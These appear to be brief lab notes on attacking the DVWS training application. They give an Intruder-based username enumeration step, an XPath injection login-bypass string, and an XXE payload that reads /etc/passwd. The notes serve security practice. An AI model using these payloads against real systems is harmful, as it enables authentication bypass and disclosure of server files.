
### WSDL Scanning 
* Load the check_user_information envelope into Intruder
* select username space 
* add username lists to payload



### XPATH Injection
URL: /dvws/vulnerabilities/xpath/xpath.php 
* username: foo' or 1=1 or 'a'='a 
* password: bar


### XXE 2
payload

``` 
<!DOCTYPE foo [<!ENTITY xxe2q1pa SYSTEM "file:///etc/passwd"> ]><uservalue>
<value>DVWS&xxe2q1pa;</value>
</uservalue>
```
